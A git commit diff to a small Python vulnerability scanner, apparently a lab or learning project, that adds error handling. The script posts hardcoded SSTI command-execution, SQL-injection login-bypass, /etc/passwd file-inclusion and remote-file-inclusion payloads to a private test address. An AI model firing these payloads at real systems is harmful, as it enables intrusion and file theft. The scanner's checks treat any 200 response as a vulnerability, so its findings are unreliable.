ef79fd9cbc12b9127f37b2e8fe7c4346a9a22652
dennysvande <vandesimbolon@gmail.com>
2025-03-20 05:34:57 -0700

    Add error handling.

--- Vuln-Scanner.py
+++ Vuln-Scanner.py
@@ -5,56 +5,68 @@ class Scanner:
     def __init__(self):
         """value to be tested such as payload and web url; planned to be dynamically inserted by user from command line;
         for now will be hardcoded"""
-        self.url = "http://10.10.5.130:8000/api/lfivuln"
+        self.url = "http://10.10.5.130:8000/api/sqlivuln"
         self.ssti_payload = "{{namespace.__init__.__globals__.os.popen('id').read()}}"
-        self.sqli_payload = "\\'or 1=1--"
+        self.sqli_payload = "'or 1=1--"
         self.lfi_payload = "/etc/passwd"
         self.rfi_payload = "http://127.0.0.1:4444/github-token"
         
 class Injection(Scanner):
     def ssti(self):
-        request_body = {"mathexp": self.ssti_payload}
-        response = requests.post(self.url, json=request_body, timeout=10)
-        if response.status_code == 200:
-            print(response.text)
-            print("Vulnerable to SSTI!")
-        else:
-            print("Not vulnerable")
+        try:
+            request_body = {"mathexp": self.ssti_payload}
+            response = requests.post(self.url, json=request_body, timeout=10)
+            if response.status_code == 200:
+                print(response.text)
+                print("Vulnerable to SSTI!")
+            else:
+                print("Not vulnerable")
+        except Exception as e:
+            print("Encounter an error:", e)
     
     def xss(self):
         pass
 
     def sqli(self):
-        request_body = {"username": self.sqli_payload, "password": ""}
-        print(request_body)
-        response = requests.post(self.url, json=request_body, timeout=10)
-        if response.status_code == 200:
-            print(response.text)
-            print("Vulnerable to SSTI!")
-        else:
-            print("Not vulnerable")
+        try:
+            request_body = {"username": self.sqli_payload, "password": "fakepass"}
+            print(request_body)
+            response = requests.post(self.url, json=request_body, timeout=10)
+            if response.status_code == 200:
+                print(response.text)
+                print("Vulnerable to SQLi!")
+            else:
+                print("Not vulnerable")
+        except Exception as e:
+            print("Encounter an error:", e)
 
 class BrokenAccessControl(Scanner):
     def lfi(self):
-        request_body = {"filename": self.lfi_payload}
-        response = requests.post(self.url, json=request_body, timeout=10)
-        if response.status_code == 200:
-            print(response.text)
-            print("Vulnerable to LFI!")
-        else:
-            print("Not vulnerable")
+        try:
+            request_body = {"filename": self.lfi_payload}
+            response = requests.post(self.url, json=request_body, timeout=10)
+            if response.status_code == 200:
+                print(response.text)
+                print("Vulnerable to LFI!")
+            else:
+                print("Not vulnerable")
+        except Exception as e:
+            print("Encounter an error:", e)
 
     def rfi(self):
-        request_body = {"imagelink": self.rfi_payload}
-        response = requests.post(self.url, json=request_body, timeout=10)
-        if response.status_code == 200:
-            print(response.text)
-            print("Vulnerable to RFI!")
-        else:
-            print("Not vulnerable")
+        try:
+            request_body = {"imagelink": self.rfi_payload}
+            response = requests.post(self.url, json=request_body, timeout=10)
+            if response.status_code == 200:
+                print(response.text)
+                print("Vulnerable to RFI!")
+            else:
+                print("Not vulnerable")
+        except Exception as e:
+            print("Encounter an error:", e)
 
 if __name__ == "__main__":
-    #injection_client = Injection()
-    #injection_client.sqli()
-    file_inclusion = BrokenAccessControl()
-    file_inclusion.lfi()
+    injection_client = Injection()
+    injection_client.sqli()
+    #file_inclusion = BrokenAccessControl()
+    #file_inclusion.lfi()
